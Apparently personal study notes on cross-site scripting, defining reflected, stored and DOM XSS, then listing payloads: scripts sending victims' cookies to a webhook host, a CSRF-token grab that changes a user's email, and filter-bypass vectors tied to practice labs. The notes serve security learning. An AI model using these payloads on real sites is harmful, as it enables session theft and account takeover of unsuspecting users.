## xss
cross site scripting
```
we circumvent the same origin policy
act as a user 
```
### reflected
```
Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way
```

### stored
```
Stored XSS (also known as persistent or second-order XSS)
hen an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.
```
### dom xss
```
DOM-based XSS (also known as DOM XSS) arises when an application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually
by writing the data back to the DOM.
ex::
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```
## some explits in github
https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md
```
<script>
alert(document.cookie);
var i=new Image;
i.src="=your_webhook.site_address/?"+document.cookie;
</script>
<script>
fetch('https://webhooksite_url', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
### exploit to change email address 
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### ways of blocking xss
```
block a few element tags,attributes,events
html encode <,> to stop coming out of the element (we then stay in element and use autofocus attribute then onfocus method to execute script
quatations are encoded so that 
```
### few more

```
<script>
locaiton=ursite/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>
or
<svg><animate attributeName=href values=javascript:alert(1)+%2F></svg>
or
<svg><animatetransform onbegin=alert(1)>

</script>
" autofocus onfocus=alert(document.domain) x="


https://YOUR-LAB-ID.web-security-academy.net/?'accesskey='x'onclick='alert(1)

</script><script>alert(1)</script>(when ' and / are escaped inside script element
'-alert(1)-' (when < and > are escaped inside script element
\';alert(document.domain)// when there is encoding
throw error intentinally and call or assign alert function to onerror eventhandler 
ex:onerror=alert;throw 1
in the contex of |^ script and cant use < / '


```
